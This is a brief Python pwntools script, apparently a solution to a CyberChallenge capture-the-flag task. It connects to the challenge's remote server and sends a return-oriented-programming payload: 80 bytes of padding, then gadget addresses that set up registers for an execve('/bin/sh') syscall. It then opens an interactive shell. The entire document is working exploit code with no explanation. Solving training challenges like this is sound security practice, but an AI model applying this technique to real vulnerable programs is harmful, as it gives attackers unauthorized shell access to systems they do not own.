from pwn import *
import sys
#context.log_level='debug'

p = remote('rop.challs.cyberchallenge.it',9130)

popeax = p32(0x08048606)
ebxecx = p32(0x08048609)
popedx = p32(0x0804860c)
binsh  = p32(0x08048991)

payload = b'c'*80
payload += ebxecx + binsh + p32(0)
payload += popedx + p32(0)
payload += popeax + p32(11)

#sys.stdout.buffer.write(payload)

p.recvuntil(b'Enter a number: ')
p.sendline(payload)
p.recvline()
p.interactive()
